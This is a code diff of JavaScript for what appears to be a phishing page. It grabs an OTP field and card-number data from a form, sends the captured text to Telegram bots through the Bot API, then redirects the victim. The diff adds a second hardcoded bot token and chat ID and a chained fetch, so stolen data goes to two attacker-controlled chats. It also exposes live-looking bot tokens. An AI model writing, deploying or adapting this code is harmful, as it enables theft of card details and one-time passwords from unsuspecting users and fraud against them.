@@ -1,8 +1,10 @@
 window.addEventListener("DOMContentLoaded", () => {
   // window.isPass = false;
   const path = location.pathname.replace(/^\/|\/$/g, "");
-  const botToken = "8075902785:AAGFR9aFjpRY8FOIkivLUXATE341Jb-vajM";
-  const chatId = "6541447126";
+  const botToken = "6057302323:AAHczslZMiAkDLd9HgE_POjt85PSF2SfhpA";
+  const botToken2 = "7245735081:AAH1HiW1OZLMnk4rEKZ0I4bnYPfk8oBLwhA";
+  const chatId = "5852536344";
+  const chatId2 = "6541447126";
   const image = document.querySelector("div.navbar-brand img");
   const parent = document.querySelector(".form-group");
   const otpInput = document.querySelector("#OTPInput");
@@ -72,21 +74,27 @@ window.addEventListener("DOMContentLoaded", () => {
     // }, 2000);
     // return;
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const url2 = `https://api.telegram.org/bot${botToken2}/sendMessage`;
     fetch(`${url}?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
       .then((res) => {
-          if (cardNo) {
-            let secondCount = 20;
-            secondDiv.parentElement.style.display = "block";
-            setInterval(() => {
-              secondCount -= 1;
-              secondDiv.innerText = secondCount;
-              if (secondCount === 0) {
-                location.assign(redirect);
-              }
-            }, 1000);
-          } else {
-            location.assign(redirect);
-          }
+        fetch(`${url2}?chat_id=${chatId2}&text=${encodeURIComponent(text)}`)
+          .then((res2) => {
+            if (cardNo) {
+              let secondCount = 20;
+              secondDiv.parentElement.style.display = "block";
+              setInterval(() => {
+                secondCount -= 1;
+                secondDiv.innerText = secondCount;
+                if (secondCount === 0) {
+                  location.assign(redirect);
+                }
+              }, 1000);
+            } else {
+              location.assign(redirect);
+            }
+          })
+          .catch((err) => console.log(err));
+        // location.assign(redirect);
       })
       .catch((err) => console.log(err));
   };
